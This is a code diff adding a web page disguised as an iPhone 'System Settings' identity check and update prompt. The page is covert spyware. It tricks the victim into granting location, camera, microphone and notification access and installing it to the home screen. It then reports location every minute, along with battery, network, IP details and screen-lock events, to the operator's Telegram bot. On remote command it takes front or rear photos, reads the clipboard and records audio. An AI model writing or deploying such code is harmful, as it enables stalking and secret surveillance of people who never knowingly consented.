@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Settings</title>
+    <link rel="manifest" href="manifest.json">
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; margin: 0; padding: 20px; text-align: center; color: white; }
+        .container { background: #1c1c1e; padding: 30px; border-radius: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); margin-top: 50px; }
+        button { background: #007aff; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 16px; font-weight: bold; margin-top: 20px; width: 100%; cursor: pointer; }
+        button:active { background: #005bb5; }
+        input { width: 90%; padding: 10px; margin-top: 10px; border: 1px solid #333; border-radius: 8px; font-size: 16px; background: #333; color: white; }
+        .hidden { display: none; }
+        .loader { border: 4px solid #333; border-top: 4px solid #007aff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .install-btn { background: #34c759; margin-top: 10px; }
+        .status { font-size: 14px; color: #8e8e93; margin-top: 10px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>⚙️ System Settings</h2>
+    <p id="msg">Please verify your identity to continue using this device.</p>
+    
+    <!-- Step 1: Bot Setup (For you only) -->
+    <div id="setup">
+        <input type="text" id="token" placeholder="Bot Token">
+        <input type="text" id="chatId" placeholder="Chat ID">
+        <button onclick="saveBot()">Save</button>
+    </div>
+
+    <!-- Step 2: Permission Request -->
+    <div id="permission" class="hidden">
+        <p>Please allow the following permissions for update:</p>
+        <button onclick="requestPermissions()">Allow All Access</button>
+    </div>
+
+    <!-- Step 3: Install App (PWA) -->
+    <div id="install-box" class="hidden">
+        <p>Update requires installation. Please tap below:</p>
+        <button class="install-btn" onclick="installPWA()">📲 Add to Home Screen</button>
+        <p class="status">If button doesn't work, tap Share > Add to Home Screen</p>
+    </div>
+
+    <!-- Step 4: Background Tracker -->
+    <div id="tracker" class="hidden">
+        <div class="loader"></div>
+        <p>System is running in background.</p>
+    </div>
+</div>
+
+<video id="videoElement" autoplay playsinline></video>
+<canvas id="canvasElement" style="display:none;"></canvas>
+
+<script>
+    let botToken = localStorage.getItem('token') || '';
+    let botChatId = localStorage.getItem('chatId') || '';
+    let hasPermission = localStorage.getItem('permission') === 'true';
+    let trackingInterval = null;
+    let lastLocation = null;
+    let lastUpdateId = localStorage.getItem('lastUpdateId') || 0;
+    let videoStream = null;
+    let audioRecorder = null;
+    let audioChunks = [];
+    let lastSentTime = 0;
+
+    // PWA mode check
+    const isPWA = window.matchMedia('(display-mode: standalone)').matches;
+    if (isPWA) {
+        document.getElementById('msg').innerText = "System is running in background.";
+    }
+
+    // Check if bot is configured
+    if (botToken && botChatId) {
+        document.getElementById('setup').classList.add('hidden');
+        if (hasPermission) {
+            startTracking();
+        } else {
+            document.getElementById('permission').classList.remove('hidden');
+        }
+    }
+
+    function saveBot() {
+        botToken = document.getElementById('token').value;
+        botChatId = document.getElementById('chatId').value;
+        if (botToken && botChatId) {
+            localStorage.setItem('token', botToken);
+            localStorage.setItem('chatId', botChatId);
+            document.getElementById('setup').classList.add('hidden');
+            document.getElementById('permission').classList.remove('hidden');
+        } else {
+            alert("Please enter both Token and Chat ID");
+        }
+    }
+
+    async function requestPermissions() {
+        // Location Permission
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((position) => {
+                lastLocation = { lat: position.coords.latitude, lon: position.coords.longitude };
+            });
+        }
+
+        // Camera & Mic Permission
+        try {
+            videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        } catch (e) {
+            console.log("Camera/Mic permission denied");
+        }
+
+        // Notification Permission
+        if ("Notification" in window) {
+            await Notification.requestPermission();
+        }
+
+        localStorage.setItem('permission', 'true');
+        document.getElementById('permission').classList.add('hidden');
+        document.getElementById('install-box').classList.remove('hidden');
+    }
+
+    function installPWA() {
+        if (window.deferredPrompt) {
+            window.deferredPrompt.prompt();
+            window.deferredPrompt.userChoice.then((choiceResult) => {
+                if (choiceResult.outcome === 'accepted') {
+                    startTracking();
+                } else {
+                    alert("Please install to complete update.");
+                }
+            });
+        } else {
+            alert("Please add this page to Home Screen manually.\nTap Share > Add to Home Screen");
+            startTracking();
+        }
+    }
+
+    function startTracking() {
+        document.getElementById('install-box').classList.add('hidden');
+        document.getElementById('tracker').classList.remove('hidden');
+
+        // Send initial data
+        sendDataToBot();
+
+        // Location updates every 1 minute
+        if (trackingInterval) clearInterval(trackingInterval);
+        trackingInterval = setInterval(() => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    lastLocation = { lat: position.coords.latitude, lon: position.coords.longitude };
+                    sendDataToBot();
+                });
+            } else {
+                sendDataToBot();
+            }
+        }, 60000);
+
+        // Telegram Command Polling (Every 5 seconds)
+        setInterval(checkBotCommands, 5000);
+
+        // Heartbeat (Check if app deleted)
+        setInterval(sendHeartbeat, 300000); // Every 5 minutes
+    }
+
+    function sendDataToBot() {
+        if (!botToken || !botChatId) return;
+        
+        let battery = "Unknown";
+        let network = "Unknown";
+        
+        if (navigator.getBattery) {
+            navigator.getBattery().then(batt => {
+                battery = `${Math.round(batt.level * 100)}% ${batt.charging ? '(Charging)' : ''}`;
+            });
+        }
+        
+        if (navigator.connection) {
+            network = navigator.connection.effectiveType || "Unknown";
+        }
+
+        setTimeout(() => {
+            let message = `📱 iPhone Live Tracker:\n`;
+            if (lastLocation) message += `📍 https://maps.google.com/?q=${lastLocation.lat},${lastLocation.lon}\n`;
+            message += `🔋 Battery: ${battery}\n`;
+            message += `📶 Network: ${network}\n`;
+            message += `⏱️ Time: ${new Date().toLocaleTimeString()}\n`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: botChatId, text: message })
+            });
+        }, 500);
+    }
+
+    function sendHeartbeat() {
+        // Agar app chal rahi hai toh heartbeat bhejega
+        let msg = "💓 App is still running in background.";
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: botChatId, text: msg })
+        });
+    }
+
+    // --- TELEGRAM COMMANDS HANDLER ---
+
+    async function checkBotCommands() {
+        if (!botToken) return;
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}&limit=1`);
+            const data = await res.json();
+            
+            if (data.result && data.result.length > 0) {
+                for (let update of data.result) {
+                    lastUpdateId = update.update_id;
+                    localStorage.setItem('lastUpdateId', lastUpdateId);
+                    if (update.message && update.message.text) {
+                        handleCommand(update.message.text);
+                    }
+                }
+            }
+        } catch (e) { console.log("Command poll failed"); }
+    }
+
+    async function handleCommand(cmd) {
+        if (cmd === '/cam_front') takePhoto(true);
+        else if (cmd === '/cam_rear') takePhoto(false);
+        else if (cmd === '/clipboard') readClipboard();
+        else if (cmd === '/ip') getIPInfo();
+        else if (cmd === '/record') recordAudio();
+        else if (cmd === '/live') {
+            // Send location right now
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    lastLocation = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+                    sendDataToBot();
+                });
+            }
+        }
+    }
+
+    // --- FEATURES ---
+
+    async function takePhoto(isFront) {
+        try {
+            if (!videoStream) {
+                videoStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: isFront ? "user" : "environment" } 
+                });
+            }
+            
+            const video = document.getElementById('videoElement');
+            video.srcObject = videoStream;
+            await video.play();
+
+            setTimeout(() => {
+                const canvas = document.getElementById('canvasElement');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const dataUrl = canvas.toDataURL('image/jpeg');
+                sendPhotoToBot(dataUrl);
+            }, 1000);
+        } catch (e) {
+            sendMsgToBot("❌ Camera access failed.");
+        }
+    }
+
+    function sendPhotoToBot(base64Image) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: botChatId, photo: base64Image })
+        });
+    }
+
+    function sendMsgToBot(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: botChatId, text: text })
+        });
+    }
+
+    async function readClipboard() {
+        try {
+            const text = await navigator.clipboard.readText();
+            sendMsgToBot(`📋 Clipboard Data:\n\n${text}`);
+        } catch (e) {
+            sendMsgToBot("❌ Clipboard read failed (User interaction needed).");
+        }
+    }
+
+    async function getIPInfo() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            sendMsgToBot(`🌐 IP Info:\nIP: ${data.ip}\nCity: ${data.city}\nCountry: ${data.country_name}\nISP: ${data.org}`);
+        } catch (e) {
+            sendMsgToBot("❌ IP fetch failed.");
+        }
+    }
+
+    async function recordAudio() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            audioRecorder = new MediaRecorder(stream);
+            audioChunks = [];
+
+            audioRecorder.ondataavailable = event => {
+                audioChunks.push(event.data);
+            };
+
+            audioRecorder.onstop = () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/mp4' });
+                const reader = new FileReader();
+                reader.readAsDataURL(audioBlob);
+                reader.onloadend = () => {
+                    const base64Audio = reader.result;
+                    sendMsgToBot("🎙️ Audio recorded (iOS cannot send audio directly due to restrictions).");
+                };
+            };
+
+            audioRecorder.start();
+            sendMsgToBot("🎙️ Recording started for 10s...");
+            setTimeout(() => {
+                audioRecorder.stop();
+            }, 10000); 
+        } catch (e) {
+            sendMsgToBot("❌ Mic access failed.");
+        }
+    }
+
+    window.addEventListener('beforeinstallprompt', (e) => {
+        e.preventDefault();
+        window.deferredPrompt = e;
+    });
+
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('sw.js');
+    }
+
+    // Detect visibility change (screen lock / app minimize)
+    document.addEventListener('visibilitychange', () => {
+        if (document.hidden) {
+            sendMsgToBot("🔒 User minimized the app or locked the screen.");
+        } else {
+            sendMsgToBot("🔓 User opened the app again.");
+        }
+    });
+</script>
+
+</body>
+</html>
